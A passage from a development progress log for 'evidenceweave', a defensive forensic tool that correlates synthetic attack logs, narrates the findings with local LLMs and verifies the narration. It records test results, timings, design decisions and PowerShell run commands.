- Results: case02 (hard) 3907 events, 0 unparsed; with `ws-fin01=+90` step-5 Windows events land on the key's true times (e.g. WIN-L154 raw 02:42:44.510 -> 02:41:14.510; key step 5 starts 02:41:14). Logs, answer_key.json and manifest.json for case01/case02 are byte-identical to pre-change (SHA-256 asserted in tests).
- Tests: 37 passed (24 new parser tests, 11 generator, 2 smoke).
- Decisions: skew is opt-in only; run loop in `parsers/common.py` shared by all parsers; hosts.json carries an extra `role` field so the nginx host can be resolved; ws-fin01 got IP 10.0.0.70 (outside the 10.0.0.10-60 noise range) because the generator never used one.
- Problems: none blocking; Git Bash `/tmp` is not visible to Windows Python (used the scratchpad for ad-hoc checks).

### Phase 3 — 2026-10-27
- Built: `correlation/{config,findings,util,chain,engine}.py`, six rules in `correlation/rules/`, `correlate` CLI, `scripts/check_against_key.py`.
- Files: `evidenceweave/correlation/**`, `evidenceweave/cli.py`, `scripts/check_against_key.py`, `tests/test_correlation.py`.
- Results: case01 and case02 each give all 6 stages in order, attacker 203.0.113.45 / deploy (+ svc_backup associated), recall 1.000 on every step; case02: decoy 198.51.100.23 in attempts_only_actors only, benign 4720/4698 not in the chain, persistence partial with F-persistence-2 (svc_backup creation missing). 6 extra seeds (1,2,3 x easy/hard) all recall >= 0.9 with no decoy or benign lines. With `--clock-offset ws-fin01=+90` only lateral_movement times shift 90s earlier; evidence identical.
- Tests: 68 passed (31 new correlation tests).
- Decisions: rules take the prior findings as a 4th argument (initial_access needs brute_force etc.); lateral_movement runs before persistence so 4698 is not double counted; `associated_users` kept separate from compromised `users` in attacker_entities; no hard-coded names anywhere in `correlation/`.
- Problems: first draft of the skew test used the wrong offset sign; fixed (positive offset = clock fast = events move earlier).

### Phase 4 — 2026-10-27
- Built: answer-key fix (cron session-closed lines tagged as step 4), `narrator/{llm,packs,prompts,narrate,baseline}.py`, `narrate` CLI, `tests/test_narrator.py`.
- Files: `evidenceweave/narrator/**`, `evidenceweave/generator/attack.py`, `evidenceweave/cli.py`, `tests/test_narrator.py`, `tests/test_generator.py` (+2 tests), `tests/test_parsers.py` (key hashes updated).
- Tests: 95 passed (27 new narrator tests, none touch real Ollama).
- Live (qwen2.5:7b-instruct, temperature 0, seed 42, num_ctx 16384, json mode schema): case01 chain 48.5s (7 calls, 0 failed parses, 0 retries, 9,919 tokens); case01 baseline 212.1s (7 chunks + final = 8 calls, 0 failed parses, 0 retries, 100,824 tokens); case02 chain 46.0s (7 calls, 0 failed, 0 retries, 9,895 tokens).
- Decisions: num_ctx 16384 for live runs so the unmodified 120-event baseline chunks fit; retry only for unparseable JSON; template sections never use the LLM; the baseline runs through the same client and retry helper as the chain narrator.
- Problems: first baseline test used chunk sizes too large for the context (the guard caught it); `/tmp` in Git Bash is not visible to Windows Python.

### Phase 5 — 2026-10-28
- Built: `verifier/{verdicts,structure,entities,semantics,judge,verify,repair,baseline_verify,corruption}.py`, `verify` CLI, `OllamaClient(schema=, validator=)` for the judge, `narrate_stage/narrate_summary(feedback=)`, `tests/test_verifier.py` (46 tests, fakes only).
- Tests: 140 passed (46 new).
- Live (narrator qwen2.5:7b-instruct, judge llama3.1:8b, num_ctx 16384): case01 chain verify 109.6s (round-0 judge 12.6s, repair narrator 42.5s+39.6s, judge 7.2s+7.6s, 4 model swaps, 12 repair narrator calls), accepted/total 3/10 before repair -> 4/10 after, fallbacks brute_force/web_recon/executive_summary; baseline verification 2/10 (0.333 excluding cap-only), entity coverage baseline 1/4 vs chain 4/4; corruption 25/27 caught (22 deterministic, 3 judge), 2 missed, false rejection 0/4, corruption phase 28s. case02 chain verify 149.9s: 5/14 -> 7/15, fallbacks brute_force/lateral_movement.
- Decisions: executive summary shares the repair rounds with the stages (fewer model swaps); fallback sentences skip the semantic layer; sentences of non-best attempts are labelled dropped; IP-like needs >=3 dotted groups; USER heuristics fixed after the first live run showed false positives ('recorded', 'suggest').
- Problems: first live run: `USER_NOT_GROUNDED` false positives -> general suffix/stoplist fix; judge not reproducible run to run; fake-narrator tests initially returned unparsed replies and shared event IDs across cases (test harness bugs, fixed).


### Phase 5b — 2026-10-28
- Built: see "Phase 5b" section (facts.py, runmeta.py, verifier/runner.py, ClaimJudge, sentence-level repair, `--repeat`, tests/test_phase5b.py with 29 fake-only tests).
- Tests: 169 passed.
- Live (qwen2.5:7b-instruct + llama3.1:8b, num_ctx 16384): case01 facts x3: attempt-0 supported 0.40 (0.38-0.43), final accepted 14.7 (14-15), 0 fallback units, fixed by repair 3.7, ~1525 s/run; raw 1 run: 0.10 -> 2 accepted, 5 fallback units, 300 s. case02 facts x3: 0.30 -> 15 accepted (all runs), 0 fallbacks, ~974 s; raw: 0.21 -> 6 accepted, 1 fallback, 520 s. Corruption (facts, x3, cap 70 reached): case01 catch 0.957, case02 1.000; false rejection 0.083 / 0.067.
- Decisions: judge quotes may come from the ISO timestamp field (syslog lines lack the year); facts rewritten to be self-provable after smoke runs accepted 1/27; narrative staleness check rebuilds facts.
- Problems: one judge call took 1817 s (now timeout 300); stale narrative reused in smoke #2; stale events.jsonl (pipeline_meta.json fix); broad process kill was blocked, used TaskStop only.

### Phase 6a - 2026-10-28
- Built: path grounding, facts default, format_ts, `analyze`/`report` commands, deterministic no-LLM narrative, HTML report, README, DEMO.md, demo.ps1, sample reports.
- Files: `evidenceweave/{analyze.py,report/*,verifier/deterministic.py}`, edits in `verifier/{entities,verdicts,repair}.py`, `narrator/narrate.py`, `schema.py`, `cli.py`, `scripts/{path_regression.py,demo.ps1}`, `tests/test_report.py` (21 tests), `README.md`, `docs/`.
- Tests: 190 passed (21 new; 3 old assertions adapted: explicit raw mode, and the invented-command test now expects PATH_NOT_GROUNDED too).
- Live (one run, case02 hard, qwen2.5:7b-instruct + llama3.1:8b, double judge): narrate 74.6 s, verify+repair 934.2 s (judge rounds 346/253/221 s), report 0.3 s; accepted 15, dropped 12, no fallback units, judge agreement 0.797; sentences accepted per round 8/27, 4/19, 3/15. `--reuse` rebuild 0.2 s. no-llm: ~0.3 s total, 32/33 sentences accepted, 0 dropped (case02/case01).
- Decisions: no-llm reuses `_finish` from repair.py (source relabelled `deterministic`); badge tooltips are static per source (not per-verdict); optional search box skipped; manifest "synthetic" flag = `synthetic` key or `generator_version`.
- Problems: Ollama was not running at start (started `ollama serve`); `{#` in CSS broke Jinja; judge double-run dominates runtime (~15 min).

## How to run (Windows PowerShell)
```powershell
.\.venv\Scripts\Activate.ps1        # activate venv
python -m pytest                    # run tests
python -m evidenceweave.cli --help  # run CLI
python scripts\check_ollama.py      # check Ollama + models
python -m evidenceweave.cli correlate --case-dir data\cases\case02
python scripts\check_against_key.py --case-dir data\cases\case02
python -m evidenceweave.cli narrate --case-dir data\cases\case01 --mode both --num-ctx 16384
python -m evidenceweave.cli verify --case-dir data\cases\case01 --mode all
```

